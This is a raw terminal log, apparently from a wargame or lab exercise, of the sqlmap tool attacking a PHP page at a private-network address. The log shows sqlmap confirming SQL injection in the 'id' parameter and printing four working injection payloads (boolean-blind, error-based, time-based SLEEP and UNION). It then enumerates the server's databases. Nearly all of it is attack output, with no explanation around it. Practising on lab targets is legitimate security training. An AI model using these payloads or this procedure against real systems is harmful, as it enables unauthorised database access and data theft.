funksh0n@1ity:~/git/wargames/S1.120$ sqlmap -u "http://192.168.1.120/products.php?id=2" --dbs
        ___
       __H__                                                                                                                                                          
 ___ ___[)]_____ ___ ___  {1.4.3#stable}                                                                                                                              
|_ -| . [']     | .'| . |                                                                                                                                             
|___|_  ["]_|_|_|__,|  _|                                                                                                                                             
      |_|V...       |_|   http://sqlmap.org                                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:28:19 /2020-04-10/

[17:28:19] [INFO] testing connection to the target URL
[17:28:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:28:20] [INFO] testing if the target URL content is stable
[17:28:20] [INFO] target URL content is stable
[17:28:20] [INFO] testing if GET parameter 'id' is dynamic
[17:28:20] [INFO] GET parameter 'id' appears to be dynamic
[17:28:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[17:28:20] [INFO] testing for SQL injection on GET parameter 'id'
[17:28:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:28:20] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Desription:")
[17:28:20] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[17:28:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:28:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:28:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:28:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:28:33] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:28:33] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:28:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:28:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:28:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:28:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:28:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:28:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:28:33] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:28:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:28:33] [INFO] GET parameter 'id' is 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' injectable 
[17:28:33] [INFO] testing 'Generic inline queries'
[17:28:33] [INFO] testing 'MySQL inline queries'
[17:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[17:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[17:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[17:28:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[17:28:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[17:28:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:28:43] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[17:28:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:28:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:28:43] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:28:43] [INFO] target URL appears to have 5 columns in query
[17:28:43] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[17:28:43] [WARNING] automatically patching output having last char trimmed
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 1811=1811

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=2 OR ROW(8313,5306)>(SELECT COUNT(*),CONCAT(0x7176706271,(SELECT (ELT(8313=8313,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM (SELECT 6765 UNION SELECT 9731 UNION SELECT 4578 UNION SELECT 1666)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 9666 FROM (SELECT(SLEEP(5)))NgNy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176706271,0x705168745743616c53697a59535448574d6a49744c6e68465448446746525a4e68424c7a6f627263,0x71626b7871),NULL-- -
---
[17:28:50] [INFO] the back-end DBMS is MySQL
[17:28:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 4.1
[17:28:50] [INFO] fetching database names
available databases [6]:
[*] cdcol
[*] information_schema
[*] merch
[*] mysql
[*] phpmyadmin
[*] test

[17:28:50] [INFO] fetched data logged to text files under '/home/funksh0n/.sqlmap/output/192.168.1.120'

[*] ending @ 17:28:50 /2020-04-10/

